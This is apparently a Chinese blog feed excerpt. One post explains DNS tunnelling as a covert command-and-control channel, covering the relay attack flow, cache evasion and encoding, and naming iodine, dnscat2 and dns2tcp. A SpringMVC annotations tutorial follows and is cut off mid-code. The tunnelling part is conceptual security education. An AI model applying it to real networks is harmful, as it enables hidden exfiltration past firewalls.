    <content type="html"><![CDATA[<h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><p>记录DNS隧道的原理和检测。</p><h2 id="0x00-DNS解析"><a href="#0x00-DNS解析" class="headerlink" title="0x00 DNS解析"></a>0x00 DNS解析</h2><p>DNS的解析方式可以分未两种：迭代查询和递归查询。</p><h3 id="1-迭代查询"><a href="#1-迭代查询" class="headerlink" title="1. 迭代查询"></a>1. 迭代查询</h3><p>本地域名服务器向根域名服务器发送请求报文，根域名服务器要么给出ip地址要么告诉本地域名服务器下一步应该去查询另一个域名服务器(假设这个域名服务器为A)。本地域名服务器会向A域名服务器发送请求报文，A域名服务器要么给出ip地址要么告诉本地域名服务器下一步应该去查询B域名服务器。过程以此类推，直到查找到ip地址为止。 </p><h3 id="2-递归查询"><a href="#2-递归查询" class="headerlink" title="2. 递归查询"></a>2. 递归查询</h3><p>客户机向本地域名服务器查询，如果本地服务器的缓存中没有需要查询的ip地址，那么本地域名服务器会以客户机的身份（代替本机查询），向根域名服务器发送请求报文。递归查询返回的结果要么是查询到的ip地址，要么报错。</p><blockquote><p> 递归查询即客户端只发一次请求，要求对方给出最终结果。 </p></blockquote><p><img src="/2020/11/18/DNS%E9%9A%A7%E9%81%93/1.png" alt></p><p>本机查询本地域名服务器，这部分属于递归查询。</p><p>本地域名服务器查询根域名服务器，这部分属于迭代查询。</p><h2 id="0x01-DNS隧道"><a href="#0x01-DNS隧道" class="headerlink" title="0x01 DNS隧道"></a>0x01 DNS隧道</h2><p>DNS隧道是隐蔽信道的一种，通过将其他协议封装在DNS协议中进行通信。封装由客户端完成，将DNS流量还原成正常的流量由服务器完成。 </p><h2 id="0x02-DNS隧道攻击"><a href="#0x02-DNS隧道攻击" class="headerlink" title="0x02 DNS隧道攻击"></a>0x02 DNS隧道攻击</h2><p>大多数防火墙和入侵检测设备对DNS流量是放行的。而隧道攻击正式利用了放行的特点以及协议解析流程来实现的。</p><h2 id="0x03-DNS隧道攻击类型"><a href="#0x03-DNS隧道攻击类型" class="headerlink" title="0x03 DNS隧道攻击类型"></a>0x03 DNS隧道攻击类型</h2><h3 id="1-IP直连型DNS隧道"><a href="#1-IP直连型DNS隧道" class="headerlink" title="1. IP直连型DNS隧道"></a>1. IP直连型DNS隧道</h3><p>直连也就是客户端直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，另外限制比较高，很多场景不允许自己指定DNS Server。客户端使用UDP socket建立连接，实际上是基于UDP的，但是利用53端口。</p><h3 id="2-域名型DNS隧道（中继）"><a href="#2-域名型DNS隧道（中继）" class="headerlink" title="2. 域名型DNS隧道（中继）"></a>2. 域名型DNS隧道（中继）</h3><p>通过DNS迭代查询实现的中继隧道，比较隐蔽，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。 </p><p><img src="/2020/11/18/DNS%E9%9A%A7%E9%81%93/2.png" alt></p><blockquote><p>此时PC是攻击者已经控制了，被植入了木马。并且aaa.com权威域名服务器也是在攻击者的控制之下，aaa.com域名也是攻击者的。</p></blockquote><p>手法：</p><p>Step 1：受控PC机将数据封装进DNS数据包里，像局域网内部的本地域名服务器请求查询aaa.com</p><p>Step 2：本地域名服务器透过防火墙向根域名服务器发送查询请求</p><p>Step 3：经过大量重定向，查询请求最终要aaa.com的权威域名服务器</p><p>Step 4：aaa.com权威域名服务器是在攻击者的控制下，解析发送过来的DNS数据包并发送回应包</p><p>Step 5：DNS回应包穿透防火墙</p><p>Step 6:：DNS回应包进入内网</p><p>Step 7：本地域名服务器将回应包返回给受控PC机</p><p>Step 8：受控PC机解析DNS回应包里的数据，得到新的指令</p><h2 id="0x04-DNS协议格式"><a href="#0x04-DNS协议格式" class="headerlink" title="0x04 DNS协议格式"></a>0x04 DNS协议格式</h2><p>重要部分说明：会话标识 – DNS报文的ID标识，区分DNS应答报文是哪个请求的响应</p><p><img src="/2020/11/18/DNS%E9%9A%A7%E9%81%93/3.png" alt></p><p>重要的是要知道DNS有哪几种形式的报文：</p><p><img src="/2020/11/18/DNS%E9%9A%A7%E9%81%93/4.png" alt></p><h2 id="0x05-DNS隧道要点"><a href="#0x05-DNS隧道要点" class="headerlink" title="0x05 DNS隧道要点"></a>0x05 DNS隧道要点</h2><h3 id="1-DNS缓存机制的规避"><a href="#1-DNS缓存机制的规避" class="headerlink" title="1. DNS缓存机制的规避"></a>1. DNS缓存机制的规避</h3><p>再使用中继隧道时，如果需要解析的域名在本地的DNS Server中已经有缓存时，本地的DNS Server就不会转发数据包。所以在构造的请求中，每次查询的域名都是不一样的。</p><h3 id="2-DNS载荷的编码"><a href="#2-DNS载荷的编码" class="headerlink" title="2. DNS载荷的编码"></a>2. DNS载荷的编码</h3><p>从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为2roAUSwVqwOWCaaDC.test.nuoyan.com,其中2roAUSwVqwOWCaaDc则是客户端传递给服务器的信息，这串字符解码后的信息便是DNS隧道</p><h3 id="3-可利用DNS查询类型"><a href="#3-可利用DNS查询类型" class="headerlink" title="3. 可利用DNS查询类型"></a>3. 可利用DNS查询类型</h3><p>DNS的记录类型有很多，常见的有A，AAAA,CNAME,MX,NS等。DNS隧道可以利用其中的一些记录类型来传输数据。例如A，MX，CNAME,TXT等。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A       记录 指定主机名（或域名）对应的IPV4地址记录</span><br><span class="line">AAAA    记录 指定主机名（或域名）对应的IPV6地址记录</span><br><span class="line">NS      记录  指定该域名由哪个DNS服务器来进行解析</span><br><span class="line">MX      记录  指向一个邮件服务器</span><br><span class="line">PTR     记录  将一个IP地址映射到对应的域名，也可以看成是A记录的反向</span><br><span class="line"><span class="built_in">CNAME</span>   记录  允许将多个名字映射到同一台计算机</span><br><span class="line">TXT     记录 一般指主机名或域名的说明</span><br></pre></td></tr></table></figure><h2 id="0x06-DNS隧道工具"><a href="#0x06-DNS隧道工具" class="headerlink" title="0x06 DNS隧道工具"></a>0x06 DNS隧道工具</h2><ul><li>dns2tcp：支持直连模式的DNS隧道，只实现了简单的DNS隧道，相关命令和控制服务需要自行搭建，且已在kali系统中直接集成。</li><li>iodine：最活跃、速度最快、支持直连和中继模式，且支持丰富的编码、请求类型选择</li><li>Dnscat2：封装在DNS协议中的加密C&amp;C信道，直接运行工具即可实现数据传输、文件操作等命令和控制功能。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNS隧道&quot;&gt;&lt;a href=&quot;#DNS隧道&quot; class=&quot;headerlink&quot; title=&quot;DNS隧道&quot;&gt;&lt;/a&gt;DNS隧道&lt;/h1&gt;&lt;p&gt;记录DNS隧道的原理和检测。&lt;/p&gt;
&lt;h2 id=&quot;0x00-DNS解析&quot;&gt;&lt;a href=&quot;#0x00-DNS解
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>SpringMVC注解</title>
    <link href="http://bai-ren-1.github.io/2020/09/23/SpringMVC%E6%B3%A8%E8%A7%A3/"/>
    <id>http://bai-ren-1.github.io/2020/09/23/SpringMVC%E6%B3%A8%E8%A7%A3/</id>
    <published>2020-09-23T09:26:18.000Z</published>
    <updated>2020-12-26T03:11:18.238Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SpringMVC注解"><a href="#SpringMVC注解" class="headerlink" title="SpringMVC注解"></a>SpringMVC注解</h1><h2 id="0x00-Controller"><a href="#0x00-Controller" class="headerlink" title="0x00 @Controller"></a>0x00 @Controller</h2><p>@Controller 用于标记在一个类上，使用它标记的类就是一个SpringMVC Controller 对象。分发处理器将会扫描使用了该注解的类的方法，并检测该方法是否使用了@RequestMapping 注解。@Controller 只是定义了一个控制器类，而使用@RequestMapping 注解的方法才是真正处理请求的处理器。</p><p>@Controller 标记在一个类上还不能真正意义上的说它就是SpringMVC 的一个控制器类，因为这个时候Spring 还不认识它。这个时候就需要我们把这个控制器类交给Spring 来管理。有两种方式可以管理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--方式一--&gt;</span><br><span class="line">&lt;bean class=&quot;com.cqvie.handler.HelloWorld&quot;/&gt;</span><br><span class="line">&lt;!--方式二--&gt;</span><br><span class="line">&lt; context:component-scan base-package = &quot;com.cqvie&quot; /&gt; &lt;!-- 路径写到controller的上一层 --&gt;</span><br></pre></td></tr></table></figure><p>此外Controller 不会直接依赖于HttpServletRequest 和HttpServletResponse 等HttpServlet 对象，它们可以通过Controller 的方法参数灵活的获取到。为了先对Controller 有一个初步的印象，以下先定义一个简单的        Controller ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package com.cqvie.handler;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/helloworld&quot;)</span><br><span class="line">    public String sayHello() &#123;</span><br><span class="line">        System.out.println(&quot;Hello World!&quot;);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-RequestMapping"><a href="#0x01-RequestMapping" class="headerlink" title="0x01 @RequestMapping"></a>0x01 @RequestMapping</h2><p>RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。</p><p>返回值会通过视图解析器解析为实际的物理视图，对于 InternalResourceViewResolver 视图解析器，会做如下的解析：<br>通过 prefix + returnVal + suffix 这样的方式得到实际的物理视图，然后做转发操作；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 配置视图解析器：如何把 handler 方法返回值解析为实际的物理视图 --&gt;</span><br><span class="line">     &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class="line">         &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot;&gt;&lt;/property&gt;</span><br><span class="line">         &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt;</span><br><span class="line">     &lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>RequestMapping注解有六个属性:</p><p><strong>1、 value</strong></p><p>value：指定请求的实际地址；</p><p><strong>2、method；</strong></p><p>method： 指定请求的method类型， GET、POST、PUT、DELETE等，下面例子的@PathVariable后面讲解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Rest 风格的 URL（以 CRUD 为例）：</span><br><span class="line">     *         新增：/order POST</span><br><span class="line">     *         修改：/order/1 PUT</span><br><span class="line">     *         获取：/order/1 GET</span><br><span class="line">     *         删除：/order/1 DELETE</span><br><span class="line">     * @param id</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(value = &quot;/testRestPut/&#123;id&#125;&quot;, method = RequestMethod.PUT)</span><br><span class="line">    public String testRestPut(@PathVariable int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRestPut:&quot; + id);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(value = &quot;/testRestDelete/&#123;id&#125;&quot;, method = RequestMethod.DELETE)</span><br><span class="line">    public String testRestDelete(@PathVariable int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRestDelete:&quot; + id);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(value = &quot;/testRestPost/&#123;id&#125;&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String testRestPost(@PathVariable int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRestPost:&quot; + id);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(&quot;/testRestGet&quot;)</span><br><span class="line">    public String testRestGet() &#123;</span><br><span class="line">        System.out.println(&quot;testRestGet&quot;);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>3、consumes</strong></p><p>consumes： 指定处理请求的提交内容类型（Content-Type），例如application/json, text/html;</p><p><strong>4、produces</strong></p><p>produces:  指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回；</p><p><strong>5、params</strong></p><p>params： 指定request中必须包含某些参数值是，才让该方法处理。</p><p><strong>6、headers</strong></p><p>headers： 指定request中必须包含某些指定的header值，才能让该方法处理请求。</p><p><strong>@RequestMapping(“/helloword/?/aa”) 的 Ant 路径,匹配符：</strong><br>?：匹配文件名的一个字符<br><em>：匹配文件名的所有字符<br>*</em>：匹配多层路径</p><p><strong>@RequestMapping(“/testPojo”) POJO类用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　@RequestMapping(&quot;/testPojo&quot;)</span><br><span class="line">public String testPojo(User user) &#123;</span><br><span class="line">    System.out.println(&quot;testPojo:&quot; + user);</span><br><span class="line">    return &quot;success&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>@RequestMapping(“/testPojo”) Map用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　@RequestMapping(&quot;/testMap&quot;)</span><br><span class="line">public String testMap(Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">    map.put(&quot;names&quot;, Arrays.asList(&quot;Tomcat&quot;, &quot;Eclipse&quot;, &quot;JavaEE&quot;));</span><br><span class="line">    return &quot;success&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>@RequestMapping(“/testPojo”) ModelAndView用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　@RequestMapping(&quot;/testModelAndView&quot;)</span><br><span class="line">public ModelAndView testModelAndView() &#123;</span><br><span class="line">    String viewName = SUCCESS;</span><br><span class="line">    ModelAndView modelAndView = new ModelAndView(viewName);</span><br><span class="line">    modelAndView.addObject(&quot;time&quot;, new Date());</span><br><span class="line">    return modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-Resource和-Autowired"><a href="#0x02-Resource和-Autowired" class="headerlink" title="0x02 @Resource和@Autowired"></a>0x02 @Resource和@Autowired</h2><p>@Resource和@Autowired都是做bean的注入时使用，其实@Resource并不是Spring的注解，它的包是javax.annotation.Resource，需要导入，但是Spring支持该注解的注入。</p><p><strong>1、共同点</strong></p><p>两者都可以写在字段和setter方法上。两者如果都写在字段上，那么就不需要再写setter方法。</p><p><strong>2、不同点</strong></p><p>（1）@Autowired</p><p>@Autowired为Spring提供的注解，需要导入包org.springframework.beans.factory.annotation.Autowired;只按照byType注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld&#123;</span><br><span class="line">    // 下面两种@Autowired只要使用一种即可</span><br><span class="line">    @Autowired</span><br><span class="line">    private UserDao userDao; // 用于字段上</span><br><span class="line">    </span><br><span class="line">    @Autowired</span><br><span class="line">    public void setUserDao(UserDao userDao) &#123; // 用于属性的方法上</span><br><span class="line">        this.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@Autowired注解是按照类型（byType）装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许null值，可以设置它的required属性为false。如果我们想使用按照名称（byName）来装配，可以结合@Qualifier注解一起使用。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld&#123; 　　@Autowired 　　@Qualifier(&quot;userDao&quot;) 　　private UserDao userDao; &#125;</span><br></pre></td></tr></table></figure><p>（2）@Resource</p><p>@Resource默认按照ByName自动注入，由J2EE提供，需要导入包javax.annotation.Resource。@Resource有两个重要的属性：name和type，而Spring将@Resource注解的name属性解析为bean的名字，而type属性则解析为bean的类型。所以，如果使用name属性，则使用byName的自动注入策略，而使用type属性时则使用byType自动注入策略。如果既不制定name也不制定type属性，这时将通过反射机制使用byName自动注入策略。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld&#123;</span><br><span class="line">    // 下面两种@Resource只要使用一种即可</span><br><span class="line">    @Resource(name=&quot;userDao&quot;)</span><br><span class="line">    private UserDao userDao; // 用于字段上</span><br><span class="line">    </span><br><span class="line">    @Resource(name=&quot;userDao&quot;)</span><br><span class="line">    public void setUserDao(UserDao userDao) &#123; // 用于属性的setter方法上</span><br><span class="line">        this.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：最好是将@Resource放在setter方法上，因为这样更符合面向对象的思想，通过set、get去操作属性，而不是直接去操作属性。</p><h2 id="0x03-PathVariable"><a href="#0x03-PathVariable" class="headerlink" title="0x03 @PathVariable"></a>0x03 @PathVariable</h2><p>用于将请求URL中的模板变量映射到功能处理方法的参数上，即取出uri模板中的变量作为参数。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@Controller  </span><br><span class="line">public class TestController &#123;  </span><br><span class="line">     @RequestMapping(value=&quot;/user/&#123;userId&#125;/roles/&#123;roleId&#125;&quot;,method = RequestMethod.GET)  </span><br><span class="line">     public String getLogin(@PathVariable(&quot;userId&quot;) String userId,  </span><br><span class="line">         @PathVariable(&quot;roleId&quot;) String roleId)&#123;  </span><br><span class="line">         System.out.println(&quot;User Id : &quot; + userId);  </span><br><span class="line">         System.out.println(&quot;Role Id : &quot; + roleId);  </span><br><span class="line">         return &quot;hello&quot;;  </span><br><span class="line">     &#125;  </span><br><span class="line">     @RequestMapping(value=&quot;/product/&#123;productId&#125;&quot;,method = RequestMethod.GET)  </span><br><span class="line">     public String getProduct(@PathVariable(&quot;productId&quot;) String productId)&#123;  </span><br><span class="line">           System.out.println(&quot;Product Id : &quot; + productId);  </span><br><span class="line">           return &quot;hello&quot;;  </span><br><span class="line">     &#125;  </span><br><span class="line">     @RequestMapping(value=&quot;/javabeat/&#123;regexp1:[a-z-]+&#125;&quot;,  </span><br><span class="line">           method = RequestMethod.GET)  </span><br><span class="line">     public String getRegExp(@PathVariable(&quot;regexp1&quot;) String regexp1)&#123;  </span><br><span class="line">           System.out.println(&quot;URI Part 1 : &quot; + regexp1);  </span><br><span class="line">           return &quot;hello&quot;;  </span><br><span class="line">     &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-CookieValue"><a href="#0x04-CookieValue" class="headerlink" title="0x04 @CookieValue"></a>0x04 @CookieValue</h2><p>作用：用来获取Cookie中的值；</p><p>参数： value：参数名称  required：是否必须  defaultValue：默认值</p><p>使用案例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * 获取 Session</span><br><span class="line">     * JSESSIONID=411A032E02A2594698F6E3F4458B9CE4</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testCookieValue&quot;)</span><br><span class="line">    public String testCookieValue(@CookieValue(&quot;JSESSIONID&quot;) String sessionId) &#123;</span><br><span class="line">        System.out.println(&quot;JSESSIONID = &quot; + sessionId);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-RequestParam"><a href="#0x05-RequestParam" class="headerlink" title="0x05 @RequestParam"></a>0x05 @RequestParam</h2><p>@RequestParam用于将请求参数区数据映射到功能处理方法的参数上，用例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * @RequestParam(&quot;id&quot;) 带参映射</span><br><span class="line">     * @param id</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testRequestParam&quot;)</span><br><span class="line">    public String testRequestParam(@RequestParam(&quot;id&quot;) int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRequestParam  &quot; + id);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-SessionAttributes"><a href="#0x06-SessionAttributes" class="headerlink" title="0x06 @SessionAttributes"></a>0x06 @SessionAttributes</h2><p>@SessionAttributes即将值放到session作用域中，写在class上面。　　</p><p>@SessionAttributes 除了可以通过属性名指定需要放到会话中的属性外（value 属性值），</p><p><em>还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）,用例：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package com.cqvie.yjq;</span><br><span class="line"></span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.SessionAttributes;</span><br><span class="line"></span><br><span class="line">import com.cqvie.model.User;</span><br><span class="line"></span><br><span class="line">@SessionAttributes(value = &#123;&quot;user&quot;&#125;, types = &#123;String.class&#125;)</span><br><span class="line">@RequestMapping(&quot;/springmvc&quot;)</span><br><span class="line">@Controller</span><br><span class="line">public class SessionAttributesTest &#123;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * @SessionAttributes</span><br><span class="line">     *         除了可以通过属性名指定需要放到会话中的属性外（value 属性值），</span><br><span class="line">     *         还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）。</span><br><span class="line">     * 注意： 该注解只能放在类的上面，不能放在方法上面</span><br><span class="line">     * </span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testSessionAttributes&quot;)</span><br><span class="line">    public String testSessionAttributes(Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">        User user = new User(1, &quot;刘邦&quot;, &quot;qwe&quot;, &quot;123&quot;, &quot;辽宁&quot;);</span><br><span class="line">        map.put(&quot;user&quot;, user);</span><br><span class="line">        map.put(&quot;school&quot;, &quot;重庆&quot;);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x07-ModelAttribute"><a href="#0x07-ModelAttribute" class="headerlink" title="0x07 @ModelAttribute"></a>0x07 @ModelAttribute</h2><p>代表的是：该Controller的所有方法在调用前，先执行此@ModelAttribute方法，可用于注解和方法参数中，可以把这个@ModelAttribute特性，应用在BaseController当中，所有的Controller继承BaseController，即可实现在调用Controller时，先执行@ModelAttribute方法。　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">package com.cqvie.yjq;</span><br><span class="line"></span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.ModelAttribute;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line">import com.cqvie.model.User;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;/springmvc&quot;)</span><br><span class="line">public class ModelAttributeTest &#123;</span><br><span class="line"></span><br><span class="line">    private static final String SUCCESS = &quot;success&quot;;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 1.有 @ModelAttribute 标记的方法，会在每个目标方法执行之前被 SpringMVC 调用</span><br><span class="line">     * 2.@ModelAttribute注解也可以修饰目标方法POJO类形的入参，其value的属性值有如下作用：</span><br><span class="line">     *     1）SpringMVC会使用value属性值在implicitModel中查找对应的对象，若存在则直接传入到目标方法的入参中</span><br><span class="line">     *     2）SpringMVC会以value为key,POJO类型的对象为value，存入的request中</span><br><span class="line">     * </span><br><span class="line">     * @param id</span><br><span class="line">     * @param map</span><br><span class="line">     */</span><br><span class="line">    @ModelAttribute</span><br><span class="line">    public void getUser(@RequestParam(value = &quot;id&quot;, required = false) int id,</span><br><span class="line">            Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">        //模拟数据库中获取对象</span><br><span class="line">        User user = new User(1, &quot;刘邦&quot;, &quot;123&quot;, &quot;023&quot;, &quot;重庆&quot;);</span><br><span class="line">        